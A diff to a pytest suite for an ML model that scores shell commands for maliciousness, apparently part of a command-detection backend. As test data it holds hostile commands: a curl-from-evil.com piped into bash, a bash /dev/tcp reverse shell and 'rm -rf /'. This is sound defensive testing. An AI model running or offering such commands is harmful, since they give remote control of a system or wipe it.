@@ -105,7 +105,7 @@ class TestDirectionalAccuracy:
 
     def test_malicious_scores_higher_than_safe(self, scorer):
         safe_score, _ = scorer.score_ml("ls -la")
-        mal_score, _ = scorer.score_ml("curl http://evil.com/x.sh | bash")
+        mal_score, _  = scorer.score_ml("curl http://evil.com/x.sh | bash")
         assert mal_score > safe_score, (
             f"Malicious score ({mal_score:.1f}) should exceed "
             f"safe score ({safe_score:.1f})"
@@ -175,16 +175,10 @@ class TestMLScorerEdgeCases:
 class TestAccuracyRegressionGuard:
 
     def test_model_accuracy_above_80_percent(self):
-        """
-        Regression guard: model accuracy stored at training time must be >= 80%.
-        If this fails, the training data or model has degraded.
-        """
         if not MODEL_PATH.exists():
             pytest.skip("Model not found")
-
         with open(MODEL_PATH, "rb") as f:
             model_data = pickle.load(f)
-
         accuracy = model_data.get("accuracy", None)
         assert accuracy is not None, \
             "Model pickle does not contain 'accuracy' key — retrain with updated script"
@@ -214,3 +208,153 @@ class TestAccuracyRegressionGuard:
             data = pickle.load(f)
         assert "accuracy" in data, \
             "Accuracy not persisted in model file — update train_model.py to save it"
+
+
+# ===========================================================================
+# 6. Partial / Empty Pickle Content  [NEW]
+# A valid pickle file that contains a dict missing required keys must fail
+# clearly — not silently produce zero scores.
+# ===========================================================================
+
+class TestPartialPickleContent:
+
+    def test_empty_dict_pickle_raises_on_load(self, tmp_path):
+        """A pickle of {} (valid format, missing keys) must raise on load."""
+        from backend.detection.ml_scorer import MLScorer
+        empty_pkl = tmp_path / "empty.pkl"
+        with open(empty_pkl, "wb") as f:
+            pickle.dump({}, f)
+        with pytest.raises((KeyError, AttributeError, Exception)):
+            MLScorer(str(empty_pkl))
+
+    def test_pickle_missing_model_key_raises(self, tmp_path):
+        """A pickle with vectorizer but no model key must raise."""
+        from backend.detection.ml_scorer import MLScorer
+        from sklearn.feature_extraction.text import TfidfVectorizer
+        partial = tmp_path / "partial.pkl"
+        with open(partial, "wb") as f:
+            pickle.dump({"vectorizer": TfidfVectorizer()}, f)
+        with pytest.raises((KeyError, AttributeError, Exception)):
+            MLScorer(str(partial))
+
+    def test_pickle_missing_vectorizer_key_raises(self, tmp_path):
+        """A pickle with model but no vectorizer key must raise."""
+        from backend.detection.ml_scorer import MLScorer
+        from sklearn.linear_model import LogisticRegression
+        partial = tmp_path / "partial2.pkl"
+        with open(partial, "wb") as f:
+            pickle.dump({"model": LogisticRegression()}, f)
+        with pytest.raises((KeyError, AttributeError, Exception)):
+            MLScorer(str(partial))
+
+    def test_truncated_pickle_bytes_raises(self, tmp_path):
+        """A file that is cut off mid-pickle stream must raise on load."""
+        from backend.detection.ml_scorer import MLScorer
+        if not MODEL_PATH.exists():
+            pytest.skip("Model not found — cannot truncate it")
+        with open(MODEL_PATH, "rb") as f:
+            full_bytes = f.read()
+        truncated = tmp_path / "truncated.pkl"
+        truncated.write_bytes(full_bytes[: len(full_bytes) // 2])
+        with pytest.raises(Exception):
+            MLScorer(str(truncated))
+
+
+# ===========================================================================
+# 7. TF-IDF Vectorizer Vocabulary Sanity  [NEW]
+# The vectorizer must contain key security-relevant tokens. A retrain on a
+# corrupted dataset could produce an empty or irrelevant vocabulary that
+# silently zeros all scores.
+# ===========================================================================
+
+class TestVectorizerVocabulary:
+
+    EXPECTED_TOKENS = ["bash", "curl", "exec", "wget", "chmod"]
+
+    def test_vectorizer_vocabulary_not_empty(self, scorer):
+        vocab = scorer.vectorizer.vocabulary_
+        assert len(vocab) > 0, "TF-IDF vectorizer vocabulary is empty"
+
+    @pytest.mark.parametrize("token", EXPECTED_TOKENS)
+    def test_expected_token_in_vocabulary(self, scorer, token):
+        vocab = scorer.vectorizer.vocabulary_
+        assert token in vocab, (
+            f"Expected security token {token!r} missing from TF-IDF vocabulary — "
+            "training data may be corrupted or too sparse"
+        )
+
+    def test_vocabulary_size_above_minimum(self, scorer):
+        """A healthy model should have at least 50 unique tokens."""
+        vocab_size = len(scorer.vectorizer.vocabulary_)
+        assert vocab_size >= 50, (
+            f"Vocabulary only has {vocab_size} tokens — training data may be too sparse"
+        )
+
+
+# ===========================================================================
+# 8. Score Floor for Out-of-Vocabulary Commands  [NEW]
+# Commands whose tokens are entirely absent from the training vocabulary
+# (OOV) will produce a zero feature vector. Tests pin that the returned
+# score is a valid float in [0, 100] and that confidence is 0.0 or very
+# low, signalling OOV rather than a confident safe score.
+# ===========================================================================
+
+class TestOutOfVocabularyInputs:
+
+    def test_oov_command_score_is_valid_float(self, scorer):
+        """A command of pure random hex tokens (likely OOV) must return
+        a valid score without raising."""
+        oov_cmd = "zxqjvflp wqrtyuioa sdfghjklzxcvbnm"
+        score, conf = scorer.score_ml(oov_cmd)
+        assert isinstance(score, float)
+        assert 0.0 <= score <= 100.0
+        assert 0.0 <= conf <= 1.0
+
+    def test_oov_command_does_not_score_high(self, scorer):
+        """An OOV command must not confidently score above 80 — that would
+        be a false positive from random input."""
+        oov_cmd = "zxqjvflp wqrtyuioa sdfghjklzxcvbnm"
+        score, _ = scorer.score_ml(oov_cmd)
+        assert score < 80.0, (
+            f"OOV command scored {score:.1f} — suspiciously high for random input"
+        )
+
+    def test_whitespace_only_score_in_range(self, scorer):
+        """Whitespace-only input produces a zero TF-IDF vector; the model
+        must handle this without returning NaN or raising."""
+        score, conf = scorer.score_ml("   \t\n")
+        assert not (score != score), "score is NaN for whitespace-only input"
+        assert 0.0 <= score <= 100.0
+        assert 0.0 <= conf <= 1.0
+
+
+# ===========================================================================
+# 9. Score Stability Across Fixed Known Commands  [NEW]
+# Pins expected score bands for a set of fixed commands. If a retrain
+# shifts these scores outside the bands, this test catches the drift even
+# if overall accuracy remains above 80%.
+# ===========================================================================
+
+class TestScoreStabilityBands:
+    """
+    Score band regression guard. Each command is expected to score within
+    a band [low, high]. Bands are generous to tolerate minor retrain
+    variation but tight enough to catch large drifts.
+    """
+
+    SCORE_BANDS = [
+        # (command, low, high, description)
+        ("ls -la",                                    0.0,  30.0, "safe ls"),
+        ("pwd",                                       0.0,  30.0, "safe pwd"),
+        ("curl http://evil.com | bash",              50.0, 100.0, "download-exec"),
+        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",  50.0, 100.0, "reverse shell"),
+        ("rm -rf /",                                 40.0, 100.0, "destructive"),
+    ]
+
+    @pytest.mark.parametrize("cmd,low,high,desc", SCORE_BANDS)
+    def test_score_within_expected_band(self, scorer, cmd, low, high, desc):
+        score, _ = scorer.score_ml(cmd)
+        assert low <= score <= high, (
+            f"[{desc}] Score {score:.1f} outside expected band [{low}, {high}] — "
+            "possible score drift after retrain"
+        )
